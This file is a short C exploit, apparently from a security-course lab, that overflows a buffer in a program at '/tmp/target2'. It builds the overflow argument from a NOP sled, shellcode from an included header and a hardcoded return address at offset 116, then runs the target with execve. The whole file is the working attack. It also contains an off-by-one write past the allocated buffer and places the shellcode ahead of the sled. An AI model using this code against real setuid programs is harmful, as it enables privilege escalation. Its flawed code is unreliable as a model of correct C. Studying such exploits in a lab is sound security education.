#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;
  //offset is 116
  args[1] = malloc(201);
  args[1][201]="\0";
  memset(args[1],0x90, 200);
  memcpy(args[1],shellcode,strlen(shellcode));
  *(unsigned int*)(args[1]+116)= 0xbffffc90;
  printf("\n%s",args[1]);
  printf("\n%d\n",strlen(args[1]));
  fflush(stdout);

  if (0 > execve( TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
